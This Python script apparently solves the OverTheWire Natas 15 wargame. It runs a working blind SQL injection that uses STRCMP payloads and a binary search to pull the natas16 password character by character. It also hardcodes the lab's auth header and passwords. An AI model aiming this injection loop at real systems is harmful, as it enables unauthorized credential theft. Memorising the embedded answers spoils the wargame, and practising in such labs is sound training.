import regex
import time
import urllib.request
#generate list of characters
chars=['0','1','2','3','4','5','6','7','8','9','A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z','a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z']
r_ex=regex.escape("HTTP/1.1 200 OK")
lt_ex=regex.escape("This user exists")
gt_ex=regex.escape("This user doesn't exist")

req=urllib.request.Request("http://natas15.natas.labs.overthewire.org/index.php?username=natas16%22%20AND%20STRCMP(\"w\",password)<1%20--%20&debug=1")
req.add_header('Authorization','Basic bmF0YXMxNTpUVGthSTdBV0c0aURFUnp0QmNFeUtWN2tSWEgxRVpSQg==')
r=urllib.request.urlopen(req)

#The login for natas15 basic auth username & password are combined with a colon then utf-8 base64 is applied. This becomes Http header.
#natas15:TTkaI7AWG4iDERztBcEyKV7kRXH1EZRB
#Authorization: Basic bmF0YXMxNTpUVGthSTdBV0c0aURFUnp0QmNFeUtWN2tSWEgxRVpSQg==
#URL codes are needed for spaces and the unbalanced quote
# %20 = space
# %22 = "

#now we can try hacking!!

#we need to make effective request in a loop up to 32 characters long for the length of the password
# we also  should used a halving algorith to quickly find each letter
pwd=""
#pwd="TRD7iZrd5gATjj9PkPEuaOlfEjHqj32V"


lbound=0
ubound=(len(chars)-1)
new_c=""
for c in range(0,32):
	lbound=0
	ubound=(len(chars)-1)
	while True:
		mid=((ubound+lbound)//2) #floor division
		print("LB={0} Mid={1} UB={2}".format(lbound,mid,ubound),end=" ")
		if lbound==mid:
			print("\nFound:"+chars[mid],end="\n\n")
			pwd=pwd+chars[mid]
			break
		new_c=pwd+chars[mid]
		req=urllib.request.Request("http://natas15.natas.labs.overthewire.org/index.php?username=natas16%22%20AND%20STRCMP(BINARY%20\""+new_c+"\",password)<0%20--%20&debug=1")
		req.add_header('Authorization','Basic bmF0YXMxNTpUVGthSTdBV0c0aURFUnp0QmNFeUtWN2tSWEgxRVpSQg==')
		r=urllib.request.urlopen(req)
		print("HTTP GET Status={0}".format(r.status))
		buf=r.read()
		str=buf.decode("utf-8")

		#Now dow Regular expression match check the query result
		m=regex.search(lt_ex,str)
		n=regex.search(gt_ex,str)
		if m is not None:
			print("Pass > "+new_c)
			lbound=mid
		#else:
			#print("Positive match fail")
		if n is not None:
			ubound=mid
			print("Pass < "+new_c)
		#else:
			#print("Negative match fail")
		regex.purge()
		time.sleep(1.0)
#we have a request that can  use looping to  slowy get the password, try every letter until
print(buf.decode("utf-8"))
